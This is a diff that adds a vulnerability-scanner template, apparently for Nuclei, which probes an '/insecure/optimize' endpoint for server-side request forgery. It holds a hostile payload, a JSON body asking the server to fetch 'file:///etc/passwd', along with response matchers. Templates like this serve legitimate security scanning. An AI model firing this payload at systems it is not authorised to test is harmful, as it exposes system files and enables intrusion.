@@ -1,0 +1,29 @@
+id: ssrf
+info:
+  name: Server Side Request Forgery
+  severity: high
+  description: Scan for Server Side Request Forgery
+requests:  
+  - method: GET
+    path:
+      - "{{BaseURL}}/insecure/optimize"
+    headers:
+      Content-Type: application/json
+    body: "{\"url\":\"file:///etc/passwd\"}"
+
+    matchers-condition: and
+
+    matchers:
+      - type: word
+        words:
+          - "file:///etc/passwd"
+        part: body
+
+      - type: word
+        words:
+          - "raw_data"
+        part: body
+
+      - type: status
+        status:
+           - 200
